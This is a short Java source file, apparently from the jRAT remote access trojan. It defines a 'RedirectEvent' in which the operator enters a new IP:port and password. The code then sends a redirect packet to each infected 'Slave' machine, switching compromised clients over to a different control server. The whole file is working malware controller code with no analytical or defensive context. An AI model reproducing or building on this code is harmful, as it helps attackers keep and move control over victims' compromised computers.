package pro.jrat.events;

import javax.swing.ImageIcon;

import pro.jrat.Slave;
import pro.jrat.packets.outgoing.Packet75Redirect;
import pro.jrat.utils.IconUtils;
import pro.jrat.utils.Utils;

public class RedirectEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
	public String ip;
	public String pass;

	public RedirectEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), ip, pass };
	}

	@Override
	public void perform(Slave sl) {
		String[] str = ip.split(":");
		sl.addToSendQueue(new Packet75Redirect(str[0], Integer.parseInt(str[1]), pass));
	}

	@Override
	public String toString() {
		return "Redirect";
	}

	@Override
	public boolean add() {
		String result = Utils.showDialog("Redirect", "Input IP:Port to redirect to");
		if (result == null) {
			return false;
		}

		String result1 = Utils.showDialog("Redirect", "Input new password");
		if (result1 == null) {
			return false;
		}
		ip = result.trim();
		pass = result1.trim();
		return true;
	}

	@Override
	public String getIcon() {
		return "redirect";
	}

}
